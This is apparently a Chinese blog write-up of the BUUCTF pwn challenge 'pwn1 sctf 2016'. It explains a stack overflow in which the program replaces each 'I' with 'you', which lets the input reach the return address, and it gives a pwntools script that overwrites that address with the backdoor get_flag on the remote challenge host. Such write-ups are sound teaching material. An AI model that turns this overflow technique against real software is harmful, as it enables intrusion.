---
author: 
  name: Zephyr
title: pwn1 sctf 2016
date: 2022-3-19 20:42:02
permalink: /pages/2e954742e524d18b
tags: 
  - buuctf
  - pwn
  - StackOverflow
---

# pwn1 sctf 2016

## 前提

### 查看文件保护

```shell
root@localhost ~# checksec pwn1_sctf_2016
[*] '/root/pwn1_sctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 静态分析

主函数只调用了一个`vuln`函数，该函数如下

![pwn1_sctf_2016_1](https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/blog/pwn1_sctf_2016_1.png)

查找函数表发现后门函数`get_flag`

![pwn1_sctf_2016_2](https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/blog/pwn1_sctf_2016_2.png)

## 思路分析

1. 目前信息
   - 变量`s`处可写入32字节数据
   - s距离返回地址的偏移量为`0x3c+4>32`，不够溢出
   - 存在后门函数
2. replace函数
   - 查看后发现其作用为循环检测将我们输入的字符`I`替换为字符`you`
3. 思路
   - `replace`函数在字符替换的过程中将1个字节替换为了3个字节的数据，所以理论上可以通过输入21个`I`加1个`a`的方式溢出到返回地址处，将该处覆盖为后门函数的地址即可获得`flag`

## exp

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
pwnfile = '/root/pwn/buuctf/pwn1_sctf_2016/pwn1_sctf_2016'
# io = process(pwnfile)
io = remote('node4.buuoj.cn', 28185)
elf = ELF(pwnfile)
backdoor = elf.symbols['get_flag']
payload = flat(['I'*21, 'a', backdoor])
io.sendline(payload)
io.interactive()
```